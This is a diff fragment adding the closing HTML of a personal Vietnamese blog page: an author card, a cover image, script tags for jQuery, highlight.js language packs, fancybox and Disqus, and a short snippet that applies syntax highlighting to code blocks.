+    
+    <h4 id="about-card-name">Manh NV</h4>
+    
+      <div id="about-card-bio">Chia sẻ là niềm vui</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Viết blog dạo
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker-alt"></i>
+        <br/>
+        VietNam
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://manhnv.com/images/cover-v1.2.0.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://manhnv.com/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script src="https://manhnv.com/js/scripts.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer src="https://manhnv.disqus.com/count.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
